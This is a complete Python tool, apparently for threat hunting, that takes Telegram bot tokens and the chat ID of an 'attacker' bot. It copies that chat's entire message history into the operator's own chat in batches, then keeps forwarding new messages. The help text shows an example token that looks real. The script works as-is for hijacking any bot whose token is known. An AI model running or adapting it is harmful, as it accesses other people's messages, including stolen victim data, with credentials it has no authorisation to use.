import requests
import sys
import time
import threading
import logging
from logging.handlers import RotatingFileHandler
from requests.exceptions import ConnectionError, Timeout

def setup_logger():
    h = RotatingFileHandler('telebotdump.log', maxBytes=1*1024*1024*1024, backupCount=1)
    h.setLevel(logging.ERROR)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    h.setFormatter(formatter)
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    logger.addHandler(h)

def retry_again(retries=5, backoff_in_seconds=1):
    def decorator(func):
        def wrapper(*args, **kwargs):
            for attempt in range(1, retries + 1):
                try:
                    return func(*args, **kwargs)
                except (ConnectionError, Timeout) as e:
                    wait_time = backoff_in_seconds * (2 ** (attempt - 1))
                    logging.error(f"Attempt {attempt} failed with error: {e}. Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
            logging.error(f"All {retries} attempts failed. Skipping...")
            return None
        return wrapper
    return decorator

@retry_again()
def get_uname(botkey):
    url = f'https://api.telegram.org/bot{botkey}/getMe' # Get username's bot
    r = requests.get(url)
    return r.json()

@retry_again()
def send_msg(botkey, chatid, text):
    url = f'https://api.telegram.org/bot{botkey}/sendMessage'
    data = {
        'chat_id': chatid,
        'text': text
    }
    r = requests.post(url, data=data)
    return r.json()

@retry_again()
def retrieve_messages(botkey, chatid, attacker_chat_id, message_ids):
    url = f'https://api.telegram.org/bot{botkey}/copyMessages' # Copy all message to our chat-id (Must join the channel first using your own account)
    req_data = {
        "from_chat_id": str(attacker_chat_id),
        "chat_id": str(chatid),
        "message_ids": message_ids,
        "disable_notification": False,
        "protect_content": False
    }
    r = requests.post(url, json=req_data)
    response = r.json()

    if r.status_code != 200 or r.json().get('ok') is False:
        logging.error(f'Error copying messages: {response}')
    else:
        return response

def retrieve_messages_by_batch(botkey, chatid, attacker_chat_id, start_id, last_message_id):
    batchSize = 50
    for i in range(start_id, last_message_id + 1, batchSize):
        batch = list(range(i, min(i + batchSize, last_message_id + 1)))
        retrieve_messages(botkey, chatid, attacker_chat_id, batch)

@retry_again()
def getUpdates_func(botkey, offset=None):
    url = f'https://api.telegram.org/bot{botkey}/getUpdates'
    params = {'timeout': 100, 'offset': offset}
    r = requests.get(url, params=params)
    return r.json()

def get_newUpdates(botkey, chatid): # Updates every incoming new messages
    processed_message_ids = set()
    while True:
        try:
            updates = getUpdates_func(botkey)
            if 'result' in updates and updates['result']:
                for update in updates['result']:
                    if 'message' in update:
                        message = update['message']
                        message_id = message['message_id']
                        if message_id in processed_message_ids:
                            continue
                        chat_type = message['chat']['type']
                        message_text = message['text']
                        send_msg(botkey, chatid, message_text)
                        processed_message_ids.add(message_id)
            time.sleep(2)
        except Exception as e:
            logging.error(f'Error in get_newUpdates: {e}')
            time.sleep(5)

def parse_botInfo(botkey, attacker_chat_id, chatid, mode):
    try:
        bot_info = get_uname(botkey)
        if not bot_info.get('ok'):
            logging.error(f'Failed to get bot info: {bot_info}')
            return
        botname = bot_info['result']['username']

        if mode != 'updateonly':
            start_message = send_msg(botkey, chatid, "Here is our latest message :)") # Please change the message
            last_message_id = start_message['result']['message_id']
            retrieve_messages_by_batch(botkey, chatid, attacker_chat_id, 1, last_message_id)

        get_newUpdates(botkey, chatid)
    except Exception as e:
        logging.error(f'Error in parse_botInfo - Bot: {botkey} - Error: {e}')

def start_func(mode):
    while True:
        try:
            print("[*] To add more Bot tokens at runtime ↓)")
            botkey = input("NEW BOT TOKEN (ex. 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11): ")
            attacker_chat_id = input("ATTACKER CHAT ID (ex. 987654321): ")
            chatid = input("YOUR CHAT ID (ex. 1234567890): ")
            print()
            thread = threading.Thread(target=parse_botInfo, args=(botkey, attacker_chat_id, chatid, mode))
            thread.start()
        except Exception as e:
            logging.error(f'Error adding new bot: {e}')

def main():
    if len(sys.argv) not in (2, 4):
        print("Usage: python3 telebotdump.py <config_file> [-mode updateonly]")
        sys.exit(1)

    if sys.argv[1] in ('-h'):
        print("""
Usage:  python3 telebotdump.py <config_file> [-mode updateonly]

Example:
        # Default mode, perform both dumping messages and get new real-time update activity
        python3 telebotdump.py config.txt

        # Update-only mode, perform only update activity
        python3 telebotdump.py config.txt -mode updateonly

Options:
        -h, --help       Show this help message and exit

Arguments:
        config_file         Configuration file containing bot tokens, attacker chat IDs, and your chat ID.
                            Each line in the file should have the format: <BOT TOKEN ID> <ATTACKER CHAT ID> <YOUR CHAT ID>
        -mode updateonly    Only perform updates, skip brute force

Example of config file format:
        7342309939:AAFSgOLG_25mu-QZE8M7bSPufJJNknYj1JY 467115391 7093036821
        1234567890:ABCDeFGH_1ijKlMnOpQrStUvWxYz 987654321 7093036821
""")
        sys.exit(0)
    
    config_file = sys.argv[1]
    mode = 'default'
    if len(sys.argv) == 4 and sys.argv[2] == '-mode' and sys.argv[3] == 'updateonly':
        mode = 'updateonly'
        print("[*] MODE = updateonly")

    setup_logger()

    print("[*] Dumping your messages... ")
    print("[*] Please check telebotdump.log for any issues")

    threads = []
    with open(config_file, 'r') as file:
        lines = file.readlines()
        for i in lines:
            try:
                botkey, attacker_chat_id, chatid = i.strip().split()
                thread = threading.Thread(target=parse_botInfo, args=(botkey, attacker_chat_id, chatid, mode))
                threads.append(thread)
                thread.start()
            except ValueError:
                logging.error(f'Invalid format in config file: {i}')
                pass
    add_thread = threading.Thread(target=start_func, args=(mode,))
    add_thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
